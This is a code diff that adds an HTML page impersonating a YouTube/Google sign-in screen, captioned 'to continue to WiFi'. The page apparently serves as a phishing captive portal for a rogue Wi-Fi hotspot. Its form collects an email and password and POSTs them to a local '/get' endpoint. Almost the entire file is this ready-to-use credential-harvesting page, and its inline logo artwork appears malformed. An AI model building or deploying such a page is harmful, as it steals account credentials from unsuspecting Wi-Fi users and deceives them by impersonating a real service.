@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>YouTube</title>
+    <style>
+      body {
+        font-family: 'Roboto', Arial, sans-serif;
+        background-color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 85%;
+        max-width: 400px;
+        padding: 20px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 16px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        text-align: center;
+        font-weight: 400;
+        color: #202124;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 16px;
+        text-align: center;
+        font-weight: 400;
+        color: #5f6368;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        height: 20px;
+        background-color: transparent;
+        font: 400 16px 'Roboto', Arial, sans-serif;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        padding: 13px 15px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #1a73e8;
+        border-width: 2px;
+        padding: 12px 14px;
+      }
+      .button-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 8px;
+      }
+      .create-account {
+        font-size: 14px;
+        color: #1a73e8;
+        text-decoration: none;
+        font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        font-weight: 500;
+        letter-spacing: 0.25px;
+      }
+      .gbtn-primary {
+        min-width: 64px;
+        border: none;
+        margin-top: 6px;
+        margin-bottom: 6px;
+        height: 36px;
+        border-radius: 4px;
+        font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        font-size: 14px;
+        font-weight: 500;
+        padding: 0 24px;
+        background-color: #1a73e8;
+        color: #fff;
+        cursor: pointer;
+        letter-spacing: 0.25px;
+      }
+      .gbtn-primary:hover {
+        background-color: #1765cc;
+        box-shadow: 0 1px 3px 1px rgba(66,133,244,0.3);
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 12px;
+        color: #5f6368;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 73 20" preserveAspectRatio="xMinYMid meet" focusable="false" width="73" height="20">
+        <g>
+          <path d="M46.2 0H38v7.6h7.1c-.6 3-3 5.5-6.1 6.3v5.2h9.9c5.8-5.3 9.1-13.2 9.1-22 0-1.4-.1-2.7-.4-4H46.2v7z" fill="#EA4335"/>
+          <path d="M24 9.5c0-3.1-2.6-5.6-5.7-5.6S12.6 6.4 12.6 9.5s2.6 5.6 5.7 5.6 5.7-2.5 5.7-5.6zm-2.5 0c0 4.4-3.4 8-5.7 8s-5.7-3.6-5.7-8 3.4-8 5.7-8 5.7 3.6 5.7 8z" fill="#FBBC05"/>
+          <path d="M5.7 9.5c0-3.1-2.6-5.6-5.7-5.6C-3.1 3.9-5.6 6.4-5.6 9.5s2.6 5.6 5.7 5.6c3.1 0 5.7-2.5 5.7-5.6zm2.5 0c0 4.4-3.4 8-5.7 8s-5.7-3.6-5.7-8 3.4-8 5.7-8 5.7 3.6 5.7 8z" fill="#4285F4"/>
+          <path d="M12.6 24.5h9.9v-5.2h-9.9z" fill="#34A853"/>
+          <path d="M24 24.5h9.9v-5.2H24z" fill="#EA4335"/>
+          <path d="M24 16.8h9.9v-5.2H24z" fill="#FBBC05"/>
+          <path d="M24 9.5h9.9V4.3H24z" fill="#4285F4"/>
+          <g>
+            <path d="M11.6 11.9l-3.3-2.3V11h-3v-2h3V6.7l3.3 2.3v2.9z" fill="#fff"/>
+            <path d="M20.1 14.4l-3.3-2.3V14h-3v-2h3v-2.3l3.3 2.3v2.4z" fill="#fff"/>
+            <path d="M28.6 16.8l-3.3-2.3V16.4h-3v-2h3v-2.3l3.3 2.3v2.4z" fill="#fff"/>
+            <path d="M37.1 11.9l-3.3-2.3V11h-3v-2h3V6.7l3.3 2.3v2.9z" fill="#fff"/>
+            <path d="M45.6 14.4l-3.3-2.3V14h-3v-2h3v-2.3l3.3 2.3v2.4z" fill="#fff"/>
+            <path d="M54.1 16.8l-3.3-2.3V16.4h-3v-2h3v-2.3l3.3 2.3v2.4z" fill="#fff"/>
+            <path d="M62.6 11.9l-3.3-2.3V11h-3v-2h3V6.7l3.3 2.3v2.9z" fill="#fff"/>
+          </g>
+        </g>
+      </svg>
+      <h1 class="g-h1">Sign in to YouTube</h1>
+      <h2 class="g-h2">to continue to WiFi</h2>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="email" placeholder="Email or phone" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <div class="button-container">
+          <a href="#" class="create-account">Create account</a>
+          <button type="submit" class="gbtn-primary">Next</button>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
